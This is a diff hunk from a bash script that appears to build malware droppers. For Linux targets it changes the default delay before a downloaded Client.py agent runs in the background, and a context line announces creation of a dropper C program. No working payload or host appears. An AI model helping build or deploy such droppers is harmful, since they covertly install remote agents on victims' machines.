@@ -10327,8 +10327,8 @@ if [ "$SOSP" = "Windows" ]; then
 elif [ "$SOSP" = "Linux" ]; then
 
       ## Set Agent (Client.py) execution delay time
-      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 10\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background." --entry) > /dev/null 2>&1
-      if [ -z "$delayTime" ]; then delayTime="10";fi
+      delayTime=$(zenity --title="☠ Enter Agent/Client execution delay time (sec) ☠" --text "example: 13\nThis delay time its required for the dropper to have time to finish\ninstall python dependencies before running the Client.py in background.\n(If this is NOT the dropper first time run then a delay of: 3 sec its enouth)." --entry) > /dev/null 2>&1
+      if [ -z "$delayTime" ]; then delayTime="13";fi
 
       ## BUILD DROPPER (to download/execute Client.py)
       echo "${BlueF}[☠]${white} Creating dropper C Program."${Reset};sleep 2
